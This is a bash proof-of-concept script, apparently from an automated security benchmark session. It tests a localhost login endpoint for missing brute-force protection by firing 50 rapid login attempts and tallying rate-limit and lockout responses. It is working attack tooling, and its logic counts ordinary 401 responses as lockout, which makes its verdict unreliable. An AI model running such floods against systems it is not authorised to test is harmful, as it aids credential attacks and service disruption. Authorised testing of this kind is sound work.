#!/bin/bash
# POC: Demonstrates missing brute force protection on login endpoint by sending 50+ rapid login attempts and showing no rate limiting (429 errors) or account lockout
# Target: ./repo
# Created: 2025-11-04T19:25:17.204Z
# Session: benchmark-XBEN-019-24-mhkyd1c6

# Brute Force Protection Test - Login Endpoint
# This script demonstrates the absence of rate limiting, account lockout,
# and brute force protection on the login endpoint

TARGET_URL="${1:-http://localhost:5000/login}"
NUM_ATTEMPTS="${2:-50}"

echo "==========================================="
echo "Brute Force Protection Test"
echo "==========================================="
echo "Target: $TARGET_URL"
echo "Number of attempts: $NUM_ATTEMPTS"
echo ""

# Track results
success_count=0
rate_limit_count=0
lockout_count=0
error_count=0

echo "Starting brute force simulation with $NUM_ATTEMPTS concurrent requests..."
echo ""

# Array to store PIDs and response codes
declare -a pids
declare -a responses

# Function to make a login attempt
make_attempt() {
    local attempt_num=$1
    local response
    local http_code
    
    # Send request with unique credentials to simulate brute force attempt
    response=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
        -d "username=attacker$attempt_num&password=password$attempt_num" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --max-time 5 2>/dev/null)
    
    http_code=$(echo "$response" | tail -n1)
    echo "$http_code"
}

# Send multiple concurrent requests
echo "Sending $NUM_ATTEMPTS login attempts..."
start_time=$(date +%s%N)

for i in $(seq 1 $NUM_ATTEMPTS); do
    make_attempt $i &
    pids+=($!)
    
    # Show progress every 10 attempts
    if [ $((i % 10)) -eq 0 ]; then
        echo "  - Sent $i/$NUM_ATTEMPTS attempts..."
    fi
done

# Wait for all background processes and collect responses
responses=()
for pid in "${pids[@]}"; do
    wait $pid
done

# Re-run to collect actual response codes for analysis
echo ""
echo "Collecting response codes from $NUM_ATTEMPTS requests..."
responses=()

for i in $(seq 1 $NUM_ATTEMPTS); do
    response=$(make_attempt $i)
    responses+=("$response")
    
    if [[ "$response" == "429" ]]; then
        ((rate_limit_count++))
    elif [[ "$response" == "403" || "$response" == "401" ]]; then
        ((lockout_count++))
    elif [[ "$response" == "302" || "$response" == "200" ]]; then
        ((success_count++))
    else
        ((error_count++))
    fi
done

end_time=$(date +%s%N)
elapsed_ms=$(( (end_time - start_time) / 1000000 ))

echo ""
echo "==========================================="
echo "Results:"
echo "==========================================="
echo "Total attempts: $NUM_ATTEMPTS"
echo "Successful responses (302/200): $success_count"
echo "Rate limit responses (429): $rate_limit_count"
echo "Lockout/Blocked responses (403/401): $lockout_count"
echo "Other errors: $error_count"
echo "Time elapsed: ${elapsed_ms}ms"
echo ""

# Check for vulnerability
if [ $rate_limit_count -eq 0 ] && [ $lockout_count -eq 0 ]; then
    echo "[VULNERABLE] No brute force protection detected!"
    echo "  - All $NUM_ATTEMPTS attempts were processed"
    echo "  - No rate limiting (429 errors)"
    echo "  - No account lockout mechanism"
    echo "  - Request completed in ${elapsed_ms}ms"
    echo ""
    echo "This endpoint is vulnerable to brute force attacks."
    exit 0
else
    echo "[PROTECTED] Brute force protection is active:"
    if [ $rate_limit_count -gt 0 ]; then
        echo "  - Rate limiting detected ($rate_limit_count 429 responses)"
    fi
    if [ $lockout_count -gt 0 ]; then
        echo "  - Account lockout detected ($lockout_count 403/401 responses)"
    fi
    exit 1
fi